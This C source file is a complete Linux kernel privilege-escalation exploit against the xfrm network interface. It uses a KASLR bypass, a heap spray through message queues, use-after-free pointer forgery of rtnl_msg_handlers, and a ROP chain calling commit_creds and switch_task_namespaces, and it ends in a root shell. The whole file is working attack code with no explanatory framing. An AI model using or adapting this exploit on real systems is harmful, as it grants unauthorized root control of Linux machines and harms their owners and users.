#define _GNU_SOURCE
#include <features.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <errno.h>
#include <ctype.h>
#include <netdb.h>

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/sysinfo.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <netlink/msg.h>
#include <netlink/attr.h>
#include <netlink/netlink.h>

#include "xfrm_netlink.h"
#include "gen.h"
#include "leak.h"
#define NUM_MSQIDS 0x80//0x1000//4096*2
#define NUM_MSQIDS_SPRAY 0x7000
#define NUM_MSQIDS_MSG_NUM 4
int error_num = 0;

unsigned long user_cs,user_ss,user_rsp,user_rflags;

void shell(void) {
        printf("ret2usr success! uid : %d\n",getuid());
        char *args[] = {"/bin/sh", "-i", NULL};
        execve(args[0], args, NULL);
}

static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp),"=r" (user_rflags) : : "memory");
}

int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {
  *(long *)msgp = msgtyp;
  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {
    perror("[-] msgsnd");
    return -1;
  }
  return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {
    perror("[-] msgrcv");
    return -1;
  }
  return 0;
}

int nl_callback_get_error_num(struct nl_msg* recv_msg, void* arg)
{

    struct nlmsghdr * ret_hdr = nlmsg_hdr(recv_msg);

    if (ret_hdr->nlmsg_type == NLMSG_ERROR) {
        //printf("Received NLMSG_ERROR message!\n");
	struct nlmsgerr *errmsg = nlmsg_data(ret_hdr);
	error_num = errmsg->error;
        return NL_STOP;
    }
}

static int clr_flag(char *ifname, short flag)
{
        struct ifreq ifr;
        int fd,skfd;

        /* Create a channel to the NET kernel. */
        if ((skfd = socket(AF_INET,SOCK_DGRAM ,0)) < 0) {
                perror("socket");
                exit(1);
        }

        fd = skfd;

        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
                fprintf(stderr, "%s: unknown interface: %s\n",
                                ifname, strerror(errno));
                return -1;
        }
        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if(flag == 1)
                ifr.ifr_flags &= ~IFF_UP;
        else if(flag == 2)
                ifr.ifr_flags |= IFF_UP;
        if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
                perror("SIOCSIFFLAGS");
                return -1;
        }
        return (0);
}

int setup_sandbox(void) {
  
  if (unshare(CLONE_NEWUSER) < 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    return -1;
  }
  
  if (unshare(CLONE_NEWNET) < 0) {
    perror("[-] unshare(CLONE_NEWNET)");
    return -1;
  }
  
}
void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
  //usleep(1000);
}

int main(void) {
    
    //char link2_name[9];
    //link2_name[8] = 0;
    char * message = malloc(0x1000);
    memset(message,0x41,0x1000);
    char * read_message = malloc(0x1000);
    memset(read_message, 0x41, 0x1000);
    int msqid[NUM_MSQIDS_SPRAY];
    save_state();
    pin_on_cpu(0);
    if (setup_sandbox() < 0){
        printf("Create sandbox fail!\n");
        return 0;
    }

    clr_flag("lo",2);
    
    //uint64_t kernel_off;
    
    uint64_t kernel_off = bypass_kaslr(0);
    uint64_t base = bypass_kaslr2(0);
    
    //uint64_t kernel_off = 0;
    //uint64_t base = 0xffff888100000000;
    printf("Step 1 finish ! %llx %llx\n", kernel_off, base);
    
    
    struct nl_sock * socket = nl_socket_alloc();

    if(nl_connect(socket,NETLINK_ROUTE)<0){
    		printf("nfnl_connect fail!\n");
		return 0;
    }
    	
    create_xfrm_link_collect(socket, "test1");
    	
    change_xfrm_link(socket, "test1", 0x10);
    
    create_xfrm_link_with_ifid(socket, "test2", 0x101);
    create_xfrm_link_with_ifid(socket, "test3", 0x102);
    create_xfrm_link_with_ifid(socket, "test4", 0x103);
    //create_xfrm_link_with_ifid(socket, "test5", 0x104); 
    for (int i = 0; i < NUM_MSQIDS_SPRAY; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
                perror("[-] msgget");
                return 0;
        }
    }

    delete_xfrm_link(socket, "test1");
    //sleep(1);
    printf("step2\n");
    
    uint64_t offset = 0x4000000; //After debug
    uint64_t address_of_test2_dev = 0;
    uint64_t address_of_test3_dev = 0;
    uint64_t address_of_test4_dev = 0;
    nl_socket_modify_cb(socket,NL_CB_MSG_IN, NL_CB_CUSTOM, nl_callback_get_error_num, NULL);
    //find the address of `test2`->dev by error number because of the difference between -EEXIST and -EINVAL
    for (int i = 0; i < 0xc000; i++){
	*(uint64_t *)&message[0x948-0x30+8] = base + offset + i*0x1000;
    	*(uint64_t *)&message[0x948-0x30+8+8+8] = 0x1000000000; //p.link_id and p.if_id
	// *(uint64_t *)&message[0x948-0x30+8+8+8+8] = 0;//p.collect_md
	//spray heap to pad the free `test1`->dev
	printf("%d\n",i);
	for (int j = 0; j < NUM_MSQIDS; j++) {
	    if (write_msg(msqid[j], message, 0xf00, 0x41) < 0) {
		    perror("[-] msgsnd");
		    return 0;
	    }
    	}
	if(address_of_test2_dev==0){
		change_xfrm_link(socket, "test2", 0x10);
		nl_recvmsgs_default(socket);
		//printf("%d %d\n",i, error_num);
	
		if(error_num==-22){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
			address_of_test2_dev = base + offset + i*0x1000;
			printf("Get address of test2 dev : %llx\n", address_of_test2_dev);
			if(address_of_test3_dev!=0&&address_of_test4_dev!=0)
				break;
		}
	}
	if(address_of_test3_dev==0){
		change_xfrm_link(socket, "test3", 0x10);
                nl_recvmsgs_default(socket);
                //printf("%d %d\n",i, error_num);

                if(error_num==-22){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
                        address_of_test3_dev = base + offset + i*0x1000;
                        printf("Get address of test3 dev : %llx\n", address_of_test3_dev);
                        change_xfrm_link(socket, "test3", 0x102);
                        if(address_of_test2_dev!=0&&address_of_test4_dev!=0)
				break;
                }
	}
	if(address_of_test4_dev==0){
                change_xfrm_link(socket, "test4", 0x10);
                nl_recvmsgs_default(socket);
                //printf("%d %d\n",i, error_num);

                if(error_num==-22){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
                        address_of_test4_dev = base + offset + i*0x1000;
                        printf("Get address of test4 dev : %llx\n", address_of_test4_dev);
                        change_xfrm_link(socket, "test4", 0x103);
                        if(address_of_test2_dev!=0&&address_of_test3_dev!=0)
                                break;
                }
        }
	
	//Free the heap of `test1`->dev to pad again
	for (int j = 0; j < NUM_MSQIDS; j++) {
	    if (read_msg(msqid[j], read_message, 0xf00, 0x41) < 0) {
                    perror("[-] msgrcv");
                    return 0;
            }
	}
    }
    
    if(address_of_test2_dev==0||address_of_test3_dev==0||address_of_test4_dev==0){
    	printf("Get address of test2 dev fail.\n");
	exit(0);
    }
    printf("Step 2 finish\n");
    //now we try to pad the heap of test3, free it first 
    printf("step 3\n");
    delete_xfrm_link(socket, "test3");
    *(uint64_t *)&message[0x948-0x30+8] = address_of_test3_dev + 0x950 - 8*0x2b; // xfrm_if->dev, will be treated as xfrmi_net->xfrmi[]
    *(uint64_t *)&message[0x948-0x30+8+8] = 0xffffffff84bb6f40 + kernel_off + 8 - 0x1c * 8; //xfrm_if->net (fake), will be treated as struct xfrm_if *, ffffffff84bb6f40 = rtnl_msg_handlers
    sleep(0.1);				
    for (int j = NUM_MSQIDS; j < NUM_MSQIDS_SPRAY; j++) {
            if (write_msg(msqid[j], message, 0xf00, 0x41) < 0) {
                    perror("[-] msgsnd");
                    return 0;
            }
    }
    sleep(0.1);
    for ( int i = 1; i < NUM_MSQIDS_MSG_NUM ; i++){
        //sleep(0.1);
        for ( int j = 0; j < NUM_MSQIDS_SPRAY; j++){
        if (write_msg(msqid[j], message, 0xf00, 0x41 + i) < 0) {
                perror("[-] msgsnd");
                return 0;
        }
    }
    }
    //Now free the heap of test1 we pad in step 2
    for (int j = 0; j < NUM_MSQIDS; j++) {
        if (read_msg(msqid[j], read_message, 0xf00, 0x41) < 0) {
                perror("[-] msgrcv");
                return 0;
        }
    }
    //Pad the heap of test1 again, and try to write to  rtnl_msg_handlers.
    //delete_xfrm_link(socket, "test3");
    memset(message, 0x41, 0x1000);
    *(uint64_t *)&message[0x948-0x30+8] = address_of_test2_dev; // xfrm_if->dev
    *(uint64_t *)&message[0x948-0x30+8+8] = address_of_test3_dev + 0x948 - 0xaa0 -8; //fake xi->net, point to the heap of test3 which we pad before in step 3
    *(uint64_t *)&message[0x948-0x30+8+8+8] = 0x1000000000; //xfrm_if->p.link_id and xfrm_if->p.if_id
    *(uint64_t *)&message[0x948-0x30+8+8+8+8] = 0;//xfrm_if->p.collect_md
    for (int j = 0; j < NUM_MSQIDS; j++) {
            if (write_msg(msqid[j], message, 0xf00, 0x41) < 0) {
                    perror("[-] msgsnd");
                    return 0;
            }
    }
    

    change_xfrm_link(socket, "test2", 0x10);
    printf("Step 3 finish\n");
    //Now we try to build a fake rtnl_msg_handlers[1]
    printf("Step 4\n");
    for (int j = 0; j < NUM_MSQIDS; j++) {
        if (read_msg(msqid[j], read_message, 0xf00, 0x41) < 0) {
                perror("[-] msgrcv");
                return 0;
        }
    }
    //delete_xfrm_link(socket, "test3");
    memset(message, 0x41, 0x1000);
    //*(uint64_t *)&message[0x948-0x30+8] = address_of_test2_dev; // xfrm_if->dev
    *(uint64_t *)&message[0x948-0x30+8] = address_of_test3_dev + 0x948; //fake xi->net, 
    *(uint64_t *)&message[0x948-0x30+8+8+8] = 0x1000000000; //xfrm_if->p.link_id and xfrm_if->p.if_id
    *(uint64_t *)&message[0x948-0x30+8+8+8+8] = 1;//xfrm_if->p.collect_md
    for (int j = 0; j < NUM_MSQIDS; j++) {
            if (write_msg(msqid[j], message, 0xf00, 0x41) < 0) {
                    perror("[-] msgsnd");
                    return 0;
            }
    }

    for (int j = NUM_MSQIDS; j < NUM_MSQIDS_SPRAY; j++) {
            if (read_msg(msqid[j], read_message, 0xf00, 0x41) < 0) {
                    perror("[-] msgsnd");
                    return 0;
            }
    }
    sleep(0.1);
    for ( int i = 1; i < NUM_MSQIDS_MSG_NUM ; i++){
        //sleep(0.1);
        for ( int j = 0; j < NUM_MSQIDS_SPRAY; j++){
        if (read_msg(msqid[j], read_message, 0xf00, 0x41 + i) < 0) {
                perror("[-] msgsnd");
                return 0;
        }
    }
    }
    memset(message, 0, 0x1000);
    *(uint64_t *)&message[0x948-0x30+8] = 0xffffffff81321c28 + kernel_off ; // xfrm_if->dev, leave ; pop rbx ; pop rbp ; mov eax, ecx ; pop r12 ; pop r13 ; ret                                            
    sleep(0.1);
    for (int j = NUM_MSQIDS; j < NUM_MSQIDS_SPRAY; j++) {
            if (write_msg(msqid[j], message, 0xf00, 0x41) < 0) {
                    perror("[-] msgsnd");
                    return 0;
            }
    }
    sleep(0.1);
    for ( int i = 1; i < NUM_MSQIDS_MSG_NUM ; i++){
        //sleep(0.1);
        for ( int j = 0; j < NUM_MSQIDS_SPRAY; j++){
        if (write_msg(msqid[j], message, 0xf00, 0x41 + i) < 0) {
                perror("[-] msgsnd");
                return 0;
        }
    }
    }
    //Final step, trigger the ROP
    struct nl_msg * msg = nlmsg_alloc();
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            1 + 16,   // TYPE, 1
            sizeof(struct ifinfomsg) + 0x100,
            NLM_F_REQUEST
    );
    struct ifinfomsg * h = malloc(sizeof(struct ifinfomsg) + 0x100);
    memset(h, 0, sizeof(struct ifinfomsg));
    h->ifi_family = 1;
    char * ops = &h[1];
    //Now we pad ROPgadget
    *(uint64_t *)&ops[0x08] = kernel_off + 0xffffffff8100c0d8;//pop rdi; ret
    *(uint64_t *)&ops[0x10] = kernel_off + 0xffffffff83c72d40;//init_cred
    *(uint64_t *)&ops[0x18] = kernel_off + 0xffffffff811feef0;//commit_creds;
    *(uint64_t *)&ops[0x20] = kernel_off + 0xffffffff8100c0d8;//pop rdi ; ret
    *(uint64_t *)&ops[0x28] = 1;
    *(uint64_t *)&ops[0x30] = kernel_off + 0xffffffff811f24c0;//find_task_by_vpid
    *(uint64_t *)&ops[0x38] = kernel_off + 0xffffffff8100c0d8;//pop rdi; ret
    *(uint64_t *)&ops[0x40] = 0;
    *(uint64_t *)&ops[0x48] = kernel_off + 0xffffffff819a0475;//or rdi, rax ; test rdi, rdi ; setne al ; ret
    *(uint64_t *)&ops[0x50] = kernel_off + 0xffffffff8151c05b;//pop rsi ; ret
    *(uint64_t *)&ops[0x58] = kernel_off + 0xffffffff83c72860;//init_nsproxy
    *(uint64_t *)&ops[0x60] = kernel_off + 0xffffffff811fcbf0;//switch_task_namespaces
    *(uint64_t *)&ops[0x68] = kernel_off + 0xffffffff82470da6;//swapgs; ret
    *(uint64_t *)&ops[0x70] = kernel_off + 0xffffffff8260123e;//iretq
    *(uint64_t *)&ops[0x78] = (uint64_t)shell;
    *(uint64_t *)&ops[0x80] = user_cs;
    *(uint64_t *)&ops[0x88] = user_rflags;
    *(uint64_t *)&ops[0x90] = user_rsp;//|8;
    *(uint64_t *)&ops[0x98] = user_ss;

    memcpy(nlmsg_data(hdr1), h, sizeof(struct ifinfomsg) + 0x100);
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len);
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    while(1);
    
    return 0;
}
